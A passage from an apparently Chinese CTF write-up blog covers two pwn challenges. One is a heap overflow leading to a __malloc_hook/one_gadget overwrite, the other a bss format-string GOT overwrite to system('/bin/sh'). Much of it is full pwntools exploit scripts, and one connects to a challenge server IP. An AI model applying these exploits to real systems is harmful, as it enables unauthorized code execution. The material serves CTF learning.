+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Baby-heap1"><a href="#Baby-heap1" class="headerlink" title="Baby-heap1"></a>Baby-heap1</h4><p>这题终于能让我涨点金币了。😀我用的版本是2.23-0ubuntu11.3_amd64，打通了。</p>
+<p>检查保护全开</p>
+<p><img src="https://s2.loli.net/2024/08/21/8KRmGhqvZ6J2s9o.png" alt="1724209732373.png"></p>
+<p>ida打开逐渐分析发现漏洞点应该是堆溢出</p>
+<p><img src="https://s2.loli.net/2024/08/21/BoYitIxRUjpP1wf.png" alt="1724209788827.png"></p>
+<p>直接开打，先布置好堆，我的第一思路还是打__malloc_hook。</p>
+<p>申请一个unsortedbin范围的chunk，之后给他delete掉，他的fd和bk指针保留，直接泄露。之后就是把你需要的数据都找到。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#1	</span>
+add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#3，防止与top chunk合并</span>
+
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x58</span> <span class="token operator">-</span> <span class="token number">0x10</span>
+fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>
+libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/OyQujLbUihsloJ6.png" alt="1724210103042.png"></p>
+<p>之后就是因为它可以任意长度堆溢出，直接free掉两个fastbin再修改chunk1的fd指针，使得其指向fake_chunk地址</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+   delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+   pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>
+   edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/AzO6afL7IoymFbR.png" alt="1724210145710.png"></p>
+<p>最后因为栈帧问题，所以需要借助realloc来进行调整。往realloc里面写入onegadget在malloc里面写入realloc。</p>
+<p><img src="https://s2.loli.net/2024/08/21/Umoj5XJ78PxHbsD.png" alt="1724210319177.png"></p>
+<p>最后getshell</p>
+<p><img src="https://s2.loli.net/2024/08/21/wXKk6JyB2GTeHqu.png" alt="1724209713808.png"></p>
+<h5 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h5><p>我们先把栈打完再去看那两个堆。因为我快吃饭了。怕没时间打完。</p>
+<p>检查保护</p>
+<p><img src="https://s2.loli.net/2024/08/21/AafzUDKSjuVLeFy.png" alt="1724222808473.png"></p>
+<p>函数有三个选项，对应三个encode</p>
+<p><img src="https://s2.loli.net/2024/08/21/HSBw9GP8AsFc5ai.png" alt="1724222932229.png"></p>
+<p>encode1，可以往这个数据段的src写入一个0x150的数据</p>
+<p><img src="https://s2.loli.net/2024/08/21/eTpk5G9LWDAmdyc.png" alt="1724223003229.png"></p>
+<p>encode2，有格式化字符串漏洞，这个buf1是bss段上的。所以这个格式化字符串是非栈上的</p>
+<p><img src="https://s2.loli.net/2024/08/21/wI3WMP4HVBGaU6i.png" alt="1724223063271.png"></p>
+<p>encode3，这个就把buf的值复制到src里面</p>
+<p><img src="https://s2.loli.net/2024/08/21/ZzOHvAbSq8a7fxY.png" alt="1724223123472.png"></p>
+<p>可以注意到每个函数里面都对应一个加密算法，就是简单的移位运算</p>
+<p><img src="https://s2.loli.net/2024/08/21/hM4zygFEW2wmVUu.png" alt="1724223200800.png"></p>
+<p>运行程序可以发现，正常情况一下只进行一次循环就通过exit(0)退出了。用ida查看qword_201700&#x3D;0x201700,发现其在encode1的src后面offset &#x3D; 0x140，将其修改为一个很大的值就可以进行多次循环，看保护+fmt大概思路也是修改got表。但是这题我感觉好奇怪，我的想法还是修改printf的got表但是好像就修改到第7次就失败了。后面一直找原因也没找到。而且这个libc版本是个小版本libc6_2.23-0ubuntu11.2_amd64。</p>
+<blockquote>
+<p>这是我自己的思路，但是行不通在这里。我之前的比赛这种非栈上的都是这么打的，您可以做个参考。</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#encode2的逆算法</span>
+<span class="token keyword">def</span> <span class="token function">choice2encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11111100</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#encode3的逆算法</span>
+<span class="token keyword">def</span> <span class="token function">choice3encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b00111111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11000000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+
+    <span class="token keyword">def</span> <span class="token function">attach</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ru<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">" encode:\n"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    ru<span class="token punctuation">(</span><span class="token string">"your choice:\n"</span><span class="token punctuation">)</span>
+    sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"keys?\n"</span><span class="token punctuation">)</span>
+    sl<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"your message to encode:\n"</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x150</span><span class="token punctuation">)</span>    
+    
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%55$p-%51$p-%11$p"</span><span class="token punctuation">)</span>
+    <span class="token comment"># pause()</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
+    __libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">240</span>
+    ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
+    codebase <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xe5b</span>
+    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
+    stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xe0</span>
+    ret_stack <span class="token operator">=</span> stack <span class="token operator">+</span><span class="token number">0x8</span>
+    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span>__libc_start_main<span class="token punctuation">)</span>
+    libc_base <span class="token operator">=</span> __libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">)</span>
+    
+    printf_got <span class="token operator">=</span> codebase <span class="token operator">+</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
+    
+    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c%14$hhn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hhn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+    
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%14$hhn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>  
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%54$hhn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hhn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>  <span class="token comment">#这之后就断掉了。</span>
+
+    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%54$hn"</span><span class="token punctuation">)</span>
+    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
+
+    ru<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>   
+    sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">" encode:\n"</span><span class="token punctuation">)</span>
+    sl<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
+
+    lg<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span>__libc_start_main<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"codebase"</span><span class="token punctuation">,</span>codebase<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"stack"</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"printf_got"</span><span class="token punctuation">,</span>printf_got<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span>
+    <span class="token comment"># gdb()</span>
+
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>下面是能打通的wp，但我还是感觉很奇怪。因为它是修改的strcpy_got的。而且是一个字节一个字节的改。</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"114.67.175.224"</span><span class="token punctuation">,</span><span class="token number">11441</span><span class="token punctuation">)</span>
+
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#encode2的逆算法</span>
+<span class="token keyword">def</span> <span class="token function">choice2encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11111100</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#encode3的逆算法</span>
+<span class="token keyword">def</span> <span class="token function">choice3encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b00111111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11000000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'keys?'</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x148</span><span class="token punctuation">)</span> 
+
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%55$p%51$p%14$p'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>   
+libc_start_main<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">240</span>
+
+<span class="token comment">#libc_base</span>
+libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span> libc_start_main<span class="token punctuation">)</span>
+libc_base<span class="token operator">=</span>libc_start_main<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>   <span class="token comment">#libc基址</span>
+<span class="token comment">#main_base</span>
+main_base<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xe5b</span>
+<span class="token comment">#stack_addr</span>
+stack_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">'leak->libc_base'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">'leak->mainbase'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">'leak->stack_addr'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+strcpy_got<span class="token operator">=</span>main_base<span class="token operator">+</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strcpy'</span><span class="token punctuation">]</span><span class="token comment">#elf的基地址  </span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'strcpyGOT'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>strcpy_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc_system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token comment">#格式化字符串，第一步</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'first'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    x <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">-</span>i
+    off_lowByte<span class="token operator">=</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">32</span><span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%14$hhn'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+    value_lowByte <span class="token operator">=</span> <span class="token punctuation">(</span>strcpy_got<span class="token operator">>></span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>value_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%50$hhn'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+  
+<span class="token comment">#格式化字符串，第二步</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'second'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    off_lowByte<span class="token operator">=</span><span class="token punctuation">(</span>strcpy_got<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%50$hhn'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+  
+    value_lowByte <span class="token operator">=</span> <span class="token punctuation">(</span>libc_system<span class="token operator">>></span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>value_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%54$hhn'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment">#执行system('/bin/sh')</span>
